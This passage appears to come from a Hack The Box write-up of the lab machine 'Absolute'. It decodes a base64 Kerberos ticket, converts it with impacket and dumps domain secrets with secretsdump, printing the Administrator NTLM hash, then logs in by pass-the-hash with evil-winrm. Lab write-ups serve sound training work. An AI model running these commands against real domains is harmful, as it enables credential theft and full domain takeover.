+jPjz/Ro+hpqqR9MHE09NRBYIs9iw1wPJ9uPf/sq1dc9/bwTvWEbCwz8Eg65kOTk62HHhy704MCv8Suqs/qgoL+3CtWuWyGxVAClwVYU/UasNASSRS91keCP8elFKaNGn6Z4WwKhNviXQ2yVJW9x0tRPmONdpvHJxksj6MsEqsLUqVVoxvB3V+QpO6qrZo8ovzBedl4c6IruSyNGcotHns/uWBR5HB6beS8seLswJylBW8tA9opfNayhKWCB583PvTz0JmB33cIHSTz4UofkHNvlvR8bHnkV5x72FlX9DvoUo4elXd4Hmx72rg9cvwONCj8B3rGLZ9PhxDrWMLrcs8ClqOEwOYvY3mLSZau8dzNhjzsqGda/xHO6zdsPOS8HmCDFBAXBND3cq5pVWISdvL8LUxckFCC78rksxdOLokmbkjTeEe/njaIDxSnAUc9cQ2jFVjG67Us+LOuqZJYbFiZB8g3xHCwWQo6o0VnklN/rHZVxZy6hW86FTaUutby6w8nyZkSf2Q5sggx+9n+ozLEEMal49jTn7dpCEMiCdbtgGZr4WTv0cnTIJUAEjYR9WUrPn2TVUUjSDgLYDix6YGdwCHeh4UXbwPOaE9F9wpXmhM2W8sM9R/RKgIexbuK9hlHntxQI94t7SFIyrs4nNosxS2dQaYlx8u+E7Uq6kVlWaa9aVjdmV4onE7AjwXLIkWuIBx+OH2PSowGB7/ciofxwnzdcrBWJ84LAYQzg3RLiMgZw0uwIZ1fHYz2nJ7MAxYS1teenWO8AaFoNdYdjTdZG8qER0ODBGpyNuue0V7HnjdCgOZvno/5N4N1ISUbGiq1OEyP4TVjMDt0YxIxIZICR/g3c8O+qDgXYjIyEHrdPWfpEBQLjK3XaESzA9PYzkjpha6veaS40B1sgwPT19ddqKRtlD/WuHvePJJQtPegB7SiLPYcspAHsiG+xijhY1vfyP76a2gl3+1QsezZu17Q6bw0YWY2P8nTQOpegTb0MhCipnuWiO9ffCt9CCjgdEwgc6gAwIBAKKBxgSBw32BwDCBvaCBujCBtzCBtKAbMBmgAwIBF6ESBBAulwHInKHbRMOOe5NCA1RloQ4bDEFCU09MVVRFLkhUQqIQMA6gAwIBAaEHMAUbA0RDJKMHAwUAQOEAAKURGA8yMDI2MDgyNTE2MTQxOFqmERgPMjAyNjA4MjYwMjE0MThapxEYDzIwMjYwOTAxMTYxNDE4WqgOGwxBQlNPTFVURS5IVEKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGFic29sdXRlLmh0Yg==
```
decode the base64 ticket
```console
$ base64 -d ticket.txt > ticket.kirbi
```
convert the ticket to ccache
```console
$ impacket-ticketConverter ticket.kirbi ticket.ccache
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```
export the ccache
```console
$ export KRB5CCNAME=$(pwd)/ticket.ccache
```
dump the hashes offline with the ccache and got the administrator NTLM hashes
```console
$ impacket-secretsdump -k -no-pass dc.absolute.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f4a6093623653f6488d5aa24c75f2ea:::
```
login as administrator with the NTLM hashes
```console
$ evil-winrm -i 10.129.232.60 -u administrator -H 1f4a6093623653f6488d5aa24c75f2ea

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
absolute\administrator
```
